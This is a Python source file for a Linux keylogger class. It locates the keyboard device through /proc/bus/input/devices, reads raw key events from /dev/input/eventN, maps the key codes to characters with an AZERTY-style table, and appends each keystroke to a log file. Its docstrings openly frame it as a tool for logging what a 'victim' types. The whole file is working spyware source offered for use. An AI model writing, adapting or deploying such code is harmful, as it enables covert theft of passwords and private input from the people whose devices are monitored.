import re
import struct

# The format of an keyboard event file. The format can be broken down as:
# long  int (l)
# long  int (l)
# short int (H)
# short int (H)
#       int (I)
FORMAT = 'llHHI'

# This is used to calculate the total size of the events
EVENT_SIZE = struct.calcsize(FORMAT)

# This array is of all possible values of the "code" portion of an event that was parsed
#
# For example: If the code value of a event was "32" then the key that was typed was the
# "d" key 
KEY_MAP = {
    2: "1",
    3: "2",
    4: "3",
    5: "4", 
    6: "5",
    7: "6",
    8: "7",
    9: "8",
    10: "9",
    11: "0",
    12: "-",
    13: "=",
    14: "[BACKSPACE]",
    15: "[TAB]", 
    16: "q",
    17: "w",
    18: "e",
    19: "r",
    20: "t",
    21: "y",
    22: "u",
    23: "i",
    24: "o",
    25: "p",
    26: "^",
    27: "$",
    28: "\n",
    29: "[CTRL]",
    30: "a", 
    31: "s",
    32: "d",
    33: "f",
    34: "g",
    35: "h", 
    36: "j",
    37: "k",
    38: "l",
    39: ";",
    40: "ù", 
    41: "*",
    42: "[SHIFT]",
    43: "<",
    44: "z",
    45: "x", 
    46: "c",
    47: "v",
    48: "b",
    49: "n",
    50: "m",
    51: ",",
    52: ".",
    53: "!",
    54: "[SHIFT]", 
    55: "FN",
    56: "ALT",
    57: " ",
    58: "[CAPSLOCK]",
}

class Keylogger:
    """The Keylogger class. Creating a object of this class can be used to setup a keylogger on a 
       victim device. The Keylogger Class Object is configured to have two variables, a signal and a
       reference to the name of the key log file to be created. The signal is used to turn the logger
       on and off.
    """
    def __init__(self, on_off, key_log):
        """Initializes a Keylogger class object

        Args:
            on_off (boolean): A signal to turn the keylogger on or off(True or False)
            key_log (str): The key log file to save the contents of the keys typed by the victim
        """
        self.on_off = on_off
        self.key_log = key_log

    def stop_logger(self):
        """Turns the keylogger off by setting self.on_off to False
        
        """
        self.on_off = False
        
    def key_logger(self):
        """The main method of a keylogger Class Object. First what it does is traverse
           the /proc/bus/input/devices directory to find any keyboard files. Keyboard
           files are identified by looking for the EV=120013, which is an identifier
           given to all keyboard devices.
        """
        # Open the file "/proc/bus/input/devices" in read mode
        with open("/proc/bus/input/devices") as f:
            lines = f.readlines()
            
            # Match lines containing "Handlers" or "EV="
            match = re.compile("Handlers|EV=")
            
            # Filter lines that have the have the handlers flags
            handlers = list(filter(match.search, lines))

            # Match lines containing "EV=120013"
            match = re.compile("EV=120013")
            
            # Loop through the filtered handlers list
            for idx, elt in enumerate(handlers):
                # If the line contains "EV=120013"
                if match.search(elt):
                    # Get the previous line from the handlers list
                    line = handlers[idx - 1]
            
            # Match strings like "event0", "event1", ... "event9".
            match = re.compile("event[0-9]")
            
            # Get the event(n) file path for the found keyboard device
            input_path = "/dev/input/" + match.search(line).group(0)
        
        # Open the keyboard file /dev/input/event(n)
        input_file = open(input_path, "rb")
        
        # Read the current event(keystroke) in the keyboard input file
        event = input_file.read(EVENT_SIZE)
        keystroke = ""
        
        # Open the keylog file
        with open(self.key_log, "a") as f:
            # While the keylogger is active
            while self.on_off:
                # Split the current event by 4 values: The first two are for the date which we don't need 
                # so we ignore them. The last three values are what we want which are:
                #
                # type: The type of input event.
                # code: The specific code for the input event.
                # value: The value associated with the input event.
                (_ , _, type, code, value) = struct.unpack(FORMAT, event)
                
                # We then check that the code is different from "0", which means that there was an event with 
                # type equal to "1", which corresponds to a pressed key
                if code != 0 and type == 1 and value == 1:
                    if code in KEY_MAP:
                        # If the code value of the event is in our key map then we write it to the log file
                        keystroke = KEY_MAP[code]
                        f.write(keystroke + "\n")
                
                # Read the next event        
                event = input_file.read(EVENT_SIZE)       
        
